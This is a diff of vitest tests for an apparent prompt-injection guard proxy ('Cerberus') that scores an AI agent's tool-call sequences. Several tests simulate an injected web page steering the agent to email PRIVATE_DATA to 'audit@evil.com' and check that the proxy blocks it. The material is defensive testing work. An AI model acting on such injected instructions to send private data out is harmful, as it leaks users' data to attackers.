@@ -14,7 +14,7 @@
  * - X-Cerberus-Blocked header on blocked responses
  */
 
-import { describe, it, expect, beforeEach, afterEach } from 'vitest';
+import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
 import { createProxy } from '../../src/proxy/server.js';
 import type { ProxyConfig } from '../../src/proxy/types.js';
 
@@ -39,6 +39,32 @@ async function get(port: number, path: string): Promise<{ status: number; json: 
   const response = await fetch(`http://127.0.0.1:${port}${path}`);
   const json: unknown = await response.json();
   return { status: response.status, json };
+}
+
+async function withUpstreamServer(
+  handler: (req: import('node:http').IncomingMessage, res: import('node:http').ServerResponse) => void,
+): Promise<{ port: number; close: () => Promise<void> }> {
+  const http = await import('node:http');
+  const port = await allocatePort();
+  const server = http.createServer(handler);
+  await new Promise<void>((resolve, reject) => {
+    server.once('error', reject);
+    server.listen(port, () => {
+      server.off('error', reject);
+      resolve();
+    });
+  });
+
+  return {
+    port,
+    close: () =>
+      new Promise<void>((resolve, reject) => {
+        server.close((err) => {
+          if (err) reject(err);
+          else resolve();
+        });
+      }),
+  };
 }
 
 // ── Test fixtures ─────────────────────────────────────────────────────────
@@ -234,6 +260,48 @@ describe('createProxy — Lethal Trifecta detection', () => {
     expect(r3.headers.get('x-cerberus-blocked')).toBe('true');
   });
 
+  it('should not execute outbound handler when the proxy blocks preflight', async () => {
+    const sendEmail = vi.fn().mockResolvedValue('Email sent');
+    const hardeningProxy = createProxy({
+      port,
+      cerberus: {
+        alertMode: 'interrupt',
+        threshold: 3,
+      },
+      tools: {
+        readCustomerData: {
+          handler: (_args) => Promise.resolve(PRIVATE_DATA),
+          trustLevel: 'trusted',
+        },
+        fetchWebpage: {
+          handler: (_args) => Promise.resolve(INJECTED_PAGE),
+          trustLevel: 'untrusted',
+        },
+        sendEmail: {
+          handler: sendEmail,
+          outbound: true,
+        },
+      },
+    });
+
+    await proxy.close();
+    proxy = hardeningProxy;
+    await proxy.listen();
+
+    const headers = { 'X-Cerberus-Session': 'blocked-before-send' };
+    await post(port, '/tool/readCustomerData', { args: {} }, headers);
+    await post(port, '/tool/fetchWebpage', { args: { url: 'https://example.com' } }, headers);
+    const blocked = await post(
+      port,
+      '/tool/sendEmail',
+      { args: { to: 'audit@evil.com', body: PRIVATE_DATA } },
+      headers,
+    );
+
+    expect(blocked.status).toBe(403);
+    expect(sendEmail).not.toHaveBeenCalled();
+  });
+
   it('should NOT block sendEmail without prior L1+L2 signals (score < threshold)', async () => {
     const headers = { 'X-Cerberus-Session': 'clean-session-no-prior' };
     // Call sendEmail directly with no prior turns — score < 3
@@ -292,21 +360,59 @@ describe('createProxy — session isolation', () => {
     expect(rB.status).toBe(200); // session-B hasn't seen L1+L2 yet
   });
 
-  it('should use a default session when no X-Cerberus-Session header is sent', async () => {
-    // Two requests without session header share the 'default' session
+  it('should isolate requests when no X-Cerberus-Session header is sent', async () => {
     const r1 = await post(port, '/tool/readCustomerData', { args: {} });
     const r2 = await post(port, '/tool/fetchWebpage', { args: {} });
     expect(r1.status).toBe(200);
     expect(r2.status).toBe(200);
-    // A third call to sendEmail on the same default session should be blocked
+
+    expect(r1.headers.get('x-cerberus-session')).toBeTruthy();
+    expect(r2.headers.get('x-cerberus-session')).toBeTruthy();
+    expect(r1.headers.get('x-cerberus-session')).not.toBe(r2.headers.get('x-cerberus-session'));
+
+    // A third call without reusing a session header should remain isolated and not be blocked
     const r3 = await post(port, '/tool/sendEmail', {
       args: { to: 'audit@evil.com', body: PRIVATE_DATA },
     });
-    expect(r3.status).toBe(403);
+    expect(r3.status).toBe(200);
+  });
+
+  it('should allow clients to reuse a generated session ID from response headers', async () => {
+    const first = await post(port, '/tool/readCustomerData', { args: {} });
+    const generatedSessionId = first.headers.get('x-cerberus-session');
+
+    expect(generatedSessionId).toBeTruthy();
+
+    const headers = { 'X-Cerberus-Session': generatedSessionId as string };
+    const second = await post(port, '/tool/fetchWebpage', { args: {} }, headers);
+    const third = await post(
+      port,
+      '/tool/sendEmail',
+      { args: { to: 'audit@evil.com', body: PRIVATE_DATA } },
+      headers,
+    );
+
+    expect(second.status).toBe(200);
+    expect(third.status).toBe(403);
   });
 });
 
 describe('createProxy — handler vs target', () => {
+  it('should throw when both handler and target are provided', () => {
+    expect(() =>
+      createProxy({
+        port: 0,
+        cerberus: { alertMode: 'log' },
+        tools: {
+          badTool: {
+            handler: () => Promise.resolve('ok'),
+            target: 'http://localhost:3001/tool',
+          },
+        },
+      }),
+    ).toThrow(/cannot specify both "target" and "handler"/i);
+  });
+
   it('should throw when neither handler nor target is provided', () => {
     expect(() =>
       createProxy({
@@ -343,6 +449,102 @@ describe('createProxy — handler vs target', () => {
     expect((json as { result: string }).result).toBe('echo:hello');
 
     await proxy.close();
+  });
+});
+
+describe('createProxy — upstream failure modes', () => {
+  it('should return 502 when upstream target responds with non-2xx', async () => {
+    const upstream = await withUpstreamServer((_req, res) => {
+      res.writeHead(503, { 'Content-Type': 'text/plain' });
+      res.end('temporary upstream failure');
+    });
+    const port = await allocatePort();
+
+    const proxy = createProxy({
+      port,
+      cerberus: { alertMode: 'log' },
+      tools: {
+        forward: { target: `http://127.0.0.1:${upstream.port}` },
+      },
+    });
+    await proxy.listen();
+
+    const { status, json } = await post(port, '/tool/forward', { args: { msg: 'hello' } });
+
+    expect(status).toBe(502);
+    expect((json as { error: string }).error).toContain('503');
+    expect((json as { error: string }).error).toContain('temporary upstream failure');
+
+    await proxy.close();
+    await upstream.close();
+  });
+
+  it('should return 502 when upstream target is unreachable', async () => {
+    const port = await allocatePort();
+    const unreachablePort = await allocatePort();
+    const proxy = createProxy({
+      port,
+      cerberus: { alertMode: 'log' },
+      tools: {
+        forward: { target: `http://127.0.0.1:${unreachablePort}` },
+      },
+    });
+    await proxy.listen();
+
+    const { status, json } = await post(port, '/tool/forward', { args: { msg: 'hello' } });
+
+    expect(status).toBe(502);
+    expect((json as { error: string }).error).toContain('Tool execution failed');
+
+    await proxy.close();
+  });
+});
+
+describe('createProxy — concurrency behavior', () => {
+  it('should keep session history isolated under concurrent requests', async () => {
+    const port = await allocatePort();
+    const proxy = createProxy(makeLethalTrifectaConfig(port));
+    await proxy.listen();
+
+    await Promise.all([
+      post(port, '/tool/readCustomerData', { args: {} }, { 'X-Cerberus-Session': 'session-A' }),
+      post(port, '/tool/fetchWebpage', { args: {} }, { 'X-Cerberus-Session': 'session-B' }),
+    ]);
+
+    const resultA = await post(
+      port,
+      '/tool/sendEmail',
+      { args: { to: 'audit@evil.com', body: PRIVATE_DATA } },
+      { 'X-Cerberus-Session': 'session-A' },
+    );
+    const resultB = await post(
+      port,
+      '/tool/sendEmail',
+      { args: { to: 'audit@evil.com', body: PRIVATE_DATA } },
+      { 'X-Cerberus-Session': 'session-B' },
+    );
+
+    expect(resultA.status).toBe(200);
+    expect(resultB.status).toBe(200);
+
+    await proxy.close();
+  });
+});
+
+describe('createProxy — config validation', () => {
+  it('should reject interrupt mode without trusted and untrusted classifications', () => {
+    expect(() =>
+      createProxy({
+        port: 0,
+        cerberus: { alertMode: 'interrupt', threshold: 3 },
+        tools: {
+          sendEmail: {
+            handler: (args) => Promise.resolve(`Email sent to ${String(args['to'])}`),
+            outbound: true,
+          },
+        },
+      }),
+    ).toThrow(/trusted and one untrusted tool classification/i);
   });
 });
 
